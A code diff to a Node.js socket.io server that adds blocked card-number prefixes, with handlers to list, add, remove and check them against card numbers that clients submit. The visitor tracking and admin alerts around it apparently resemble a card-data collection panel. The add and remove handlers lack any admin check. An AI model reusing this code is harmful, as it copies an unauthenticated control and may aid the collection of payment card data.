@@ -112,6 +112,7 @@ function saveData() {
       visitorCounter,
       savedVisitors,
       whatsappNumber,
+      globalBlockedCards,
       lastSaved: new Date().toISOString(),
     };
     const jsonData = JSON.stringify(data, null, 2);
@@ -140,6 +141,7 @@ const admins = new Map();
 let visitorCounter = savedData.visitorCounter;
 let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
 let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
+let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
 
 // Generate unique API key
 function generateApiKey() {
@@ -734,6 +736,46 @@ io.on("connection", (socket) => {
     // Broadcast to all connected clients
     io.emit("whatsapp:update", whatsappNumber);
     console.log(`WhatsApp number updated: ${whatsappNumber}`);
+  });
+
+  // Blocked Cards: Get list
+  socket.on("blockedCards:get", () => {
+    socket.emit("blockedCards:list", globalBlockedCards);
+  });
+
+  // Blocked Cards: Add prefix
+  socket.on("blockedCards:add", (prefix) => {
+    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
+      globalBlockedCards.push(prefix);
+      saveData();
+      // Notify all admins
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
+      });
+      // Broadcast to all clients
+      io.emit("blockedCards:updated", globalBlockedCards);
+      console.log(`Blocked card prefix added: ${prefix}`);
+    }
+  });
+
+  // Blocked Cards: Remove prefix
+  socket.on("blockedCards:remove", (prefix) => {
+    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
+    saveData();
+    // Notify all admins
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
+    });
+    // Broadcast to all clients
+    io.emit("blockedCards:updated", globalBlockedCards);
+    console.log(`Blocked card prefix removed: ${prefix}`);
+  });
+
+  // Blocked Cards: Check if card is blocked (for clients)
+  socket.on("blockedCards:check", (cardNumber) => {
+    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
+    const isBlocked = globalBlockedCards.includes(prefix);
+    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
